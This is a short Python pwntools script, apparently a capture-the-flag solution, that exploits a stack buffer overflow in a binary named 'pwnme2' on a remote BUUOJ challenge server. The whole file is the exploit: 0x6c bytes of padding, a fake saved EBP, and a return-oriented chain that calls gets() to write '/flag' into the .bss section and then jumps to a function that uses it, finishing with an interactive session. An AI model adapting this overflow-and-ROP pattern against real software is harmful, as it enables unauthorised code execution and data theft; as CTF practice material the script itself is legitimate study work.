# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

proc_name = 'pwnme2'
#p = process(proc_name)
p = remote('node3.buuoj.cn', 28030)
elf = ELF(proc_name)

padding = 'a' * 0x6c
fake_ebp = 'jkjk'
exec_string_addr = 0x080485CB 
gets = elf.plt['gets']
bss_addr = 0x0804A060

payload = padding + fake_ebp + p32(gets) + p32(exec_string_addr) + p32(bss_addr)

p.recvuntil('input:\n')
p.sendline(payload)

p.sendline('/flag')
p.interactive()

